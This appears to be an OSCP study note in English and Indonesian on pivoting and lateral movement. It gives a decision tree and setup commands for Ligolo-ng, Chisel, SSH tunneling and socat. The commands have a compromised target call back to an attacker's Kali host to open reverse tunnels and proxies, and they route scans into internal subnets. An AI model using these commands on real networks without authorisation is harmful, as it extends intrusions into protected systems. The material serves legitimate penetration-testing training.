---
name: "Pivoting & Lateral Movement — Ligolo-ng, Chisel, SSH"
description: "Pivoting decision tree and setup guides for OSCP covering Ligolo-ng (TUN-based), Chisel (SOCKS/HTTP), SSH tunneling, and socat port forwarding with practical configuration examples."
tags: [pivoting, lateral-movement, ligolo-ng, chisel, ssh-tunneling, socat, port-forwarding]
---

# Pivoting & Lateral Movement

## Decision Tree

```
Got shell on pivot machine?
  → Does pivot have SSH?
    → YES → SSH Tunneling (local/remote/dynamic)
    → NO → Firewall blocks all but HTTP/80?
      → YES → Chisel (HTTP tunnel via SOCKS)
      → NO → Need full network access?
        → YES → Ligolo-ng (TUN interface, acts like VPN)
        → NO → Quick single-port redirect? → SOCAT
```

## Ligolo-ng (Recommended — TUN-based)

Ligolo-ng membuat TUN interface di Kali → semua tool bisa langsung jalan tanpa proxychains.

```bash
# Setup di Kali
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
sudo ./proxy -selfcert

# Di target
./agent -connect $KALI_IP:11601 -ignore-cert

# Di console Ligolo → session → ifconfig → lihat subnet
sudo ip route add $SUBNET dev ligolo
start
```

## Chisel (SOCKS — app-by-app)

Cocok untuk web-heavy workflow, bisa HTTP tunnel melewati firewall.

```bash
# Di Kali
./chisel server -p 8000 --reverse --socks5

# Di target
./chisel client $KALI_IP:8000 R:socks

# /etc/proxychains4.conf → socks5 127.0.0.1 1080
proxychains4 nmap -sT -Pn $TARGET
```

## SSH Tunneling

```bash
# Local port forward
ssh -L 127.0.0.1:3306:10.10.10.10:3306 user@pivot

# Dynamic SOCKS proxy
ssh -D 1080 user@pivot

# Remote port forward (reverse tunnel)
ssh -R 4444:127.0.0.1:4444 user@kali
```

## SOCAT

```bash
# Single port redirect
socat TCP-LISTEN:4444,fork TCP:10.10.10.10:4444 &

# Background dengan nohup
nohup socat TCP-LISTEN:4444,fork TCP:10.10.10.10:4444 &
```

## Best Practices

- Foothold didapat → langsung cek interfaces (`ip addr`, `ifconfig`)
- Setiap interface baru adalah subnet potensial
- Prioritaskan Ligolo-ng untuk exam karena native tool support
- Double pivot: deploy agent ke deep network → route tambahan
